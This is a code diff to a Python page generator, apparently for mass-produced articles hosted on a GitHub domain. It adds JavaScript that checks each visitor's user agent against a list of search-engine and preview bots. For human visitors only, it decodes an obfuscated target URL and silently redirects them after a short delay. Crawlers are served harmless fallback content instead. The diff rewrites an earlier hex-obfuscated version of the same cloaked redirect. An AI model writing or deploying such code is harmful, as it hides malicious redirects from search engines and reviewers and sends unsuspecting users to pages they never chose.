@@ -247,10 +247,21 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
 
     # Obfuscated redirect script with bot detection + delay
     # Crawlers that execute JS (Google Rich Results) won't redirect
-    redirect_script = f'''
-    <script>
-        (function(){{var _n=navigator;var _ua=_n.userAgent||'';var _b=/bot|crawl|spider|slurp|google|bing|yandex|baidu|facebook|pinterest|whatsapp|preview|headless|phantom|puppet|lighthouse/i;if(_b.test(_ua))return;setTimeout(function(){{var _0x=['\\\\x73\\\\x65\\\\x61\\\\x72\\\\x63\\\\x68','\\\\x68\\\\x72\\\\x65\\\\x66','\\\\x6c\\\\x6f\\\\x63\\\\x61\\\\x74\\\\x69\\\\x6f\\\\x6e'];try{{var _c={encoded_target};var _u='';for(var i=0;i\u003c_c.length;i++){{_u+=String.fromCharCode(_c[i]);}}var _s=window[_0x[2]][_0x[0]];if(_s)_u+=_s;window[_0x[2]][_0x[1]]=_u;}}catch(e){{}}}},100);}})();
-    </script>'''
+    bot_regex = "var _b=/bot|crawl|spider|slurp|google|bing|yandex|baidu|facebook|pinterest|whatsapp|preview|headless|phantom|puppet|lighthouse/i;"
+    js_parts = []
+    js_parts.append("(function(){")
+    js_parts.append("var _ua=navigator.userAgent||'';")
+    js_parts.append(bot_regex)
+    js_parts.append("if(_b.test(_ua))return;")
+    js_parts.append("setTimeout(function(){try{")
+    js_parts.append("var _c=" + encoded_target + ";")
+    js_parts.append("var _u='';for(var i=0;i<_c.length;i++){_u+=String.fromCharCode(_c[i]);}")
+    js_parts.append("var _s=window.location.search;if(_s)_u+=_s;")
+    js_parts.append("window.location.href=_u;")
+    js_parts.append("}catch(e){}},100);")
+    js_parts.append("})();")
+    js_code = "".join(js_parts)
+    redirect_script = "\n    <script>\n        " + js_code + "\n    </script>"
 
     # Build page body (fallback content for bots/no-JS)
     img_tag = ""
